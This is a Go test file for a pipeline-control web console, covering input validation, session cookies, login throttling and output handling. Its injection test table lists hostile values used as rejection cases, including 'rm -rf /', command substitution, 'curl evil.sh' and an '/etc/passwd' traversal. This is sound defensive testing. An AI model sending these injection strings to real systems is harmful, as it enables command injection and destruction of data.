package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func testConfig() config {
	return config{
		MaxLoadRate:     20000,
		MaxLoadDuration: 60 * time.Second,
		SessionKey:      []byte("0123456789abcdef0123456789abcdef"),
		SessionTTL:      time.Hour,
	}
}

// TestValidateRejectsInjection is the test that matters most in this package.
//
// The console turns HTTP requests into processes, so the claim that needs
// evidence is not "valid input works" but "nothing a caller sends can become
// part of a command". Every case here is an attempt to smuggle something past
// validate, and every one must be refused rather than sanitised — a parameter
// that gets "cleaned up" and then used is the bug this is guarding against.
func TestValidateRejectsInjection(t *testing.T) {
	cfg := testConfig()

	tests := []struct {
		name   string
		action string
		params map[string]string
	}{
		{"shell metacharacters in a number", "load.send", map[string]string{"rate": "100; rm -rf /"}},
		{"command substitution", "load.send", map[string]string{"rate": "$(id)"}},
		{"backtick substitution", "load.send", map[string]string{"rate": "`id`"}},
		{"argument injection via a flag", "load.send", map[string]string{"rate": "-api=http://evil"}},
		{"newline in a number", "load.send", map[string]string{"duration": "10\nwhoami"}},
		{"null byte", "load.send", map[string]string{"rate": "100\x00"}},
		{"enum member that was not offered", "workers.scale", map[string]string{"n": "3"}},
		{"path traversal in an enum", "workers.scale", map[string]string{"n": "../../etc/passwd"}},
		{"enum with an appended command", "workers.scale", map[string]string{"n": "1 && curl evil.sh"}},
		{"rate above the deployment cap", "load.send", map[string]string{"rate": "99999999"}},
		{"rate below the floor", "load.send", map[string]string{"rate": "0"}},
		{"negative rate", "load.send", map[string]string{"rate": "-1"}},
		{"duration above the cap", "load.send", map[string]string{"duration": "99999"}},
		{"not a number at all", "load.send", map[string]string{"rate": "fast"}},
		{"infinity", "load.send", map[string]string{"rate": "Inf"}},
		{"not a number literal", "load.send", map[string]string{"rate": "NaN"}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			a, ok := actions[tc.action]
			if !ok {
				t.Fatalf("no such action %q", tc.action)
			}
			if _, err := a.validate(tc.params, cfg); err == nil {
				t.Fatalf("want rejection, got none")
			}
		})
	}
}

// TestArgvIsNeverCallerText checks the other half of the claim: that what
// survives validation is a formatted number, not the caller's bytes.
func TestArgvIsNeverCallerText(t *testing.T) {
	cfg := testConfig()
	a := actions["load.send"]

	// "1e3" and "1000.0" are both valid float syntax and both mean 1000. If the
	// caller's text were passed through, one of them would reach loadgen
	// verbatim; because it is reformatted from the parsed float64, both produce
	// the identical argv.
	for _, raw := range []string{"1e3", "1000.0", "1000"} {
		p, err := a.validate(map[string]string{"rate": raw, "duration": "15"}, cfg)
		if err != nil {
			t.Fatalf("%q: %v", raw, err)
		}
		argv := a.argv(p, cfg)
		if got := argvValue(argv, "-rate"); got != "1000" {
			t.Fatalf("%q produced -rate %q, want 1000", raw, got)
		}
	}
}

// TestDefaultsApplyWhenParamsMissing: the UI can be bypassed, so a request with
// no parameters at all must still produce a runnable command rather than a
// zero-valued one. A rate of 0 would be rejected by loadgen, but a duration of
// 0s would silently do nothing and look like a broken pipeline.
func TestDefaultsApplyWhenParamsMissing(t *testing.T) {
	cfg := testConfig()
	a := actions["load.send"]

	p, err := a.validate(nil, cfg)
	if err != nil {
		t.Fatalf("empty params should fall back to defaults: %v", err)
	}
	argv := a.argv(p, cfg)
	if got := argvValue(argv, "-rate"); got != "1000" {
		t.Fatalf("-rate %q, want the default 1000", got)
	}
	if got := argvValue(argv, "-duration"); got != "15s" {
		t.Fatalf("-duration %q, want the default 15s", got)
	}
}

// TestDeploymentCapLowersButNeverRaises. MaxLoadRate exists to protect the
// machine the console runs on, so a generous environment variable must not be
// able to talk an action past its own declared ceiling.
func TestDeploymentCapLowersButNeverRaises(t *testing.T) {
	a := actions["load.send"]

	strict := testConfig()
	strict.MaxLoadRate = 500
	if _, err := a.validate(map[string]string{"rate": "1000"}, strict); err == nil {
		t.Fatal("a rate above the deployment cap should be rejected")
	}

	permissive := testConfig()
	permissive.MaxLoadRate = 1_000_000
	if _, err := a.validate(map[string]string{"rate": "50000"}, permissive); err == nil {
		t.Fatal("the action's own Max should still bind when the deployment cap is higher")
	}
}

// TestEveryActionHasATimeout. A missing timeout is a zero one, which
// context.WithTimeout treats as already expired — the action would be killed the
// instant it started. The failure is silent and looks like the command crashing,
// so it is worth an assertion rather than a review.
func TestEveryActionHasATimeout(t *testing.T) {
	for id, a := range actions {
		if a.Timeout <= 0 {
			t.Errorf("action %q has no timeout", id)
		}
		if a.argv == nil {
			t.Errorf("action %q has no argv builder", id)
		}
		if a.ID != id {
			t.Errorf("action registered under %q reports ID %q", id, a.ID)
		}
	}
}

// TestSessionCookie covers the three ways a signed cookie goes wrong: a forged
// signature, a tampered payload, and an expiry that has passed.
func TestSessionCookie(t *testing.T) {
	a := newAuth(testConfig())

	t.Run("a freshly issued cookie is accepted", func(t *testing.T) {
		if !a.valid(withCookie(a.issue(time.Now().Add(time.Hour)))) {
			t.Fatal("want valid")
		}
	})

	t.Run("an expired cookie is rejected", func(t *testing.T) {
		if a.valid(withCookie(a.issue(time.Now().Add(-time.Second)))) {
			t.Fatal("want rejection")
		}
	})

	t.Run("a tampered expiry is rejected", func(t *testing.T) {
		// The attack this prevents: take a real cookie, push the expiry out a
		// year, keep the original signature.
		_, sig, _ := strings.Cut(a.issue(time.Now().Add(time.Hour)), ".")
		forged := "99999999999." + sig
		if a.valid(withCookie(forged)) {
			t.Fatal("want rejection")
		}
	})

	t.Run("a cookie signed with another key is rejected", func(t *testing.T) {
		other := newAuth(config{
			SessionKey: []byte("ffffffffffffffffffffffffffffffff"),
			SessionTTL: time.Hour,
		})
		if a.valid(withCookie(other.issue(time.Now().Add(time.Hour)))) {
			t.Fatal("want rejection")
		}
	})

	t.Run("garbage is rejected", func(t *testing.T) {
		for _, v := range []string{"", ".", "abc", "abc.def", "1.", ".sig"} {
			if a.valid(withCookie(v)) {
				t.Fatalf("want rejection for %q", v)
			}
		}
	})
}

// TestLoginThrottleBacksOff. Two typos are free; sustained guessing is not.
func TestLoginThrottleBacksOff(t *testing.T) {
	a := newAuth(testConfig())

	for i := 0; i < 2; i++ {
		a.recordFailure("10.0.0.1")
		if d := a.lockedFor("10.0.0.1"); d > 0 {
			t.Fatalf("attempt %d should not lock out, got %v", i+1, d)
		}
	}
	a.recordFailure("10.0.0.1")
	if a.lockedFor("10.0.0.1") <= 0 {
		t.Fatal("the third failure should start the backoff")
	}

	// The throttle is per address, so one bad client must not lock out another.
	if d := a.lockedFor("10.0.0.2"); d > 0 {
		t.Fatalf("another address should be unaffected, got %v", d)
	}

	a.clearFailures("10.0.0.1")
	if d := a.lockedFor("10.0.0.1"); d > 0 {
		t.Fatalf("a successful login should clear the backoff, got %v", d)
	}
}

// The throttle keys a map by client address, and the console is meant to be
// reachable over a tunnel. One attempt from each of a million addresses must
// therefore cost the process a bounded amount of memory, or the defence against
// guessing becomes the way to take the console down.
func TestLoginThrottleTableStaysBounded(t *testing.T) {
	a := newAuth(testConfig())

	for i := range maxTrackedIPs * 3 {
		a.recordFailure(fmt.Sprintf("198.51.100.%d", i))
	}

	a.mu.Lock()
	defer a.mu.Unlock()
	if len(a.failures) > maxTrackedIPs {
		t.Fatalf("tracking %d addresses, cap is %d", len(a.failures), maxTrackedIPs)
	}
}

// History that has stopped meaning anything is dropped, and history that is still
// in force is not: a sweep that expired a live lockout would hand an attacker a
// free reset every time an unrelated address failed a login.
func TestLoginThrottleForgetsStaleAddressesButKeepsLiveLockouts(t *testing.T) {
	a := newAuth(testConfig())
	now := time.Now()

	a.failures["198.51.100.1"] = &failure{count: 1, seen: now.Add(-failureTTL - time.Minute)}
	a.failures["198.51.100.2"] = &failure{count: 9, seen: now.Add(-time.Second), until: now.Add(time.Minute)}
	// Locked a moment ago, but its lock has since expired and it has been quiet
	// for longer than the retention window.
	a.failures["198.51.100.3"] = &failure{
		count: 9, seen: now.Add(-failureTTL - time.Hour), until: now.Add(-time.Hour)}

	a.sweep(now)

	if _, ok := a.failures["198.51.100.1"]; ok {
		t.Error("an address with one stale failure is still tracked")
	}
	if _, ok := a.failures["198.51.100.3"]; ok {
		t.Error("an expired lockout is still tracked")
	}
	if _, ok := a.failures["198.51.100.2"]; !ok {
		t.Error("a live lockout was swept away; the address would be free to guess again")
	}
}

// TestClientIPIgnoresForwardedHeaderWhenUntrusted. If X-Forwarded-For were
// trusted unconditionally, an attacker would reset their own throttle by
// changing the header on every attempt, which defeats the whole mechanism.
func TestClientIPIgnoresForwardedHeaderWhenUntrusted(t *testing.T) {
	r := httptest.NewRequest("POST", "/api/login", nil)
	r.RemoteAddr = "192.0.2.10:54321"
	r.Header.Set("X-Forwarded-For", "203.0.113.1")

	untrusted := newAuth(config{})
	if got := untrusted.clientIP(r); got != "192.0.2.10" {
		t.Fatalf("untrusted: got %q, want the socket address", got)
	}

	trusted := newAuth(config{TrustedProxy: true})
	if got := trusted.clientIP(r); got != "203.0.113.1" {
		t.Fatalf("trusted: got %q, want the forwarded address", got)
	}
}

// TestParseComposePS covers both shapes Compose v2 emits, because accepting only
// the current one makes the console show an empty stack on an older Docker.
func TestParseComposePS(t *testing.T) {
	lines := `{"Name":"edp-api","Service":"api","State":"running","Health":"healthy","Status":"Up 2 minutes"}
{"Name":"edp-kafka","Service":"kafka","State":"running","Health":"","Status":"Up 2 minutes"}`

	array := `[{"Name":"edp-api","Service":"api","State":"running","Health":"healthy","Status":"Up 2 minutes"},
{"Name":"edp-kafka","Service":"kafka","State":"running","Health":"","Status":"Up 2 minutes"}]`

	for name, raw := range map[string]string{"newline delimited": lines, "json array": array} {
		t.Run(name, func(t *testing.T) {
			got := parseComposePS([]byte(raw))
			if len(got) != 2 {
				t.Fatalf("got %d containers, want 2", len(got))
			}
			if got[0].Service != "api" || got[0].State != "running" {
				t.Fatalf("unexpected first row: %+v", got[0])
			}
		})
	}

	t.Run("empty output is not an error", func(t *testing.T) {
		if got := parseComposePS([]byte("  \n ")); len(got) != 0 {
			t.Fatalf("got %d containers, want 0", len(got))
		}
	})
}

func argvValue(argv []string, flag string) string {
	for i, a := range argv {
		if a == flag && i+1 < len(argv) {
			return argv[i+1]
		}
	}
	return ""
}

func withCookie(value string) *http.Request {
	r := httptest.NewRequest("GET", "/api/state", nil)
	r.AddCookie(&http.Cookie{Name: sessionCookie, Value: value})
	return r
}

// TestLineWriter covers the output splitter that replaced StdoutPipe.
//
// The pipe version deadlocked: Wait may not be called until a pipe is fully
// drained, and an orphaned grandchild holds it open forever — so a stopped run
// left the runner wedged with its lock held. These cases are the behaviours the
// replacement has to keep.
func TestLineWriter(t *testing.T) {
	t.Run("splits on newlines and strips CR", func(t *testing.T) {
		var got []string
		w := &lineWriter{emit: func(s string) { got = append(got, s) }}
		w.Write([]byte("first\r\nsecond\n"))
		if len(got) != 2 || got[0] != "first" || got[1] != "second" {
			t.Fatalf("got %q", got)
		}
	})

	t.Run("reassembles a line split across writes", func(t *testing.T) {
		// A pipe hands over whatever has arrived, not whole lines, so a line
		// arriving in three chunks must still emit exactly once.
		var got []string
		w := &lineWriter{emit: func(s string) { got = append(got, s) }}
		w.Write([]byte("achieved "))
		w.Write([]byte("rate 1908"))
		if len(got) != 0 {
			t.Fatalf("emitted before the newline arrived: %q", got)
		}
		w.Write([]byte(" ev/s\n"))
		if len(got) != 1 || got[0] != "achieved rate 1908 ev/s" {
			t.Fatalf("got %q", got)
		}
	})

	t.Run("flush emits a trailing line with no newline", func(t *testing.T) {
		// A process that dies mid-line still has something worth showing, and it
		// is usually the error message.
		var got []string
		w := &lineWriter{emit: func(s string) { got = append(got, s) }}
		w.Write([]byte("panic: nil map"))
		w.flush()
		if len(got) != 1 || got[0] != "panic: nil map" {
			t.Fatalf("got %q", got)
		}
		w.flush() // idempotent; a second flush must not repeat the line
		if len(got) != 1 {
			t.Fatalf("flush emitted twice: %q", got)
		}
	})

	t.Run("a line that never ends is bounded", func(t *testing.T) {
		// `docker compose up` redraws progress with carriage returns and no
		// newline for as long as a pull takes. An unbounded buffer would be a
		// slow leak with a plausible trigger.
		var got []string
		w := &lineWriter{emit: func(s string) { got = append(got, s) }}
		w.Write(make([]byte, maxLine*2))
		if len(got) == 0 {
			t.Fatal("want the buffer flushed at the cap")
		}
		if len(w.buf) > maxLine {
			t.Fatalf("buffer grew to %d, past the %d cap", len(w.buf), maxLine)
		}
	})
}

// TestConsoleRunsCannotOverwriteRecordedResults.
//
// Every script writes to results/reports/$TAG.txt or $OUT, both defaulting to
// the names the recorded experiments use. A console-driven run is a demo, not a
// measurement, so it must never land on one of those paths — otherwise pressing
// "Kill the broker" in front of an audience silently destroys the evidence
// README.md's tables cite, and the damage is invisible until someone looks at
// git status.
func TestConsoleRunsCannotOverwriteRecordedResults(t *testing.T) {
	const prefix = "console-"

	for id, a := range actions {
		for _, kv := range a.Env {
			name, value, ok := strings.Cut(kv, "=")
			if !ok {
				t.Errorf("action %q has a malformed env entry %q", id, kv)
				continue
			}
			switch name {
			case "TAG":
				if !strings.HasPrefix(value, prefix) {
					t.Errorf("action %q sets TAG=%q; it must start with %q so the run "+
						"cannot overwrite a recorded report", id, value, prefix)
				}
			case "OUT":
				if !strings.HasPrefix(filepath.Base(value), prefix) {
					t.Errorf("action %q sets OUT=%q; its basename must start with %q",
						id, value, prefix)
				}
			}
		}

		// An action that streams a report back must be reading its own
		// namespaced copy, not a recorded one.
		if a.Report != "" && !strings.HasPrefix(filepath.Base(a.Report), prefix) {
			t.Errorf("action %q reports from %q, which is a recorded result", id, a.Report)
		}
	}
}

// TestChaosActionsAreNamespaced pins the specific pairing that matters: an
// action whose script writes to $TAG must also read back that same tag's file,
// or the output pane silently shows a stale report from a previous run.
// The inspect button and the replay button differ by one flag in argv, and only
// one of them writes to a running pipeline. A visitor is invited to press the
// first without thinking, so it must not be able to become the second.
func TestInspectingTheDLQCannotReplayIt(t *testing.T) {
	look, ok := actions["dlq.inspect"]
	if !ok {
		t.Fatal("no dlq.inspect action")
	}
	for _, arg := range look.argv(values{}, testConfig()) {
		if arg == "-apply" {
			t.Fatalf("the inspect button produces records: %v", look.argv(values{}, testConfig()))
		}
	}
	if look.Destructive {
		t.Error("inspecting changes nothing; asking for confirmation teaches the operator to click through")
	}

	replay, ok := actions["dlq.replay"]
	if !ok {
		t.Fatal("no dlq.replay action")
	}
	var applies bool
	for _, arg := range replay.argv(values{}, testConfig()) {
		applies = applies || arg == "-apply"
	}
	if !applies {
		t.Error("the replay button is a dry run, so the button does nothing it claims to")
	}
	if !replay.Destructive {
		t.Error("the replay button writes to the source topic without confirmation")
	}
}

func TestChaosActionsAreNamespaced(t *testing.T) {
	for _, id := range []string{"chaos.db", "chaos.kafka"} {
		a, ok := actions[id]
		if !ok {
			t.Fatalf("no such action %q", id)
		}
		var tag string
		for _, kv := range a.Env {
			if name, value, _ := strings.Cut(kv, "="); name == "TAG" {
				tag = value
			}
		}
		if tag == "" {
			t.Errorf("action %q sets no TAG, so it writes to the recorded report", id)
			continue
		}
		want := "results/reports/" + tag + ".txt"
		if a.Report != want {
			t.Errorf("action %q writes %s but reports from %q", id, want, a.Report)
		}
	}
}
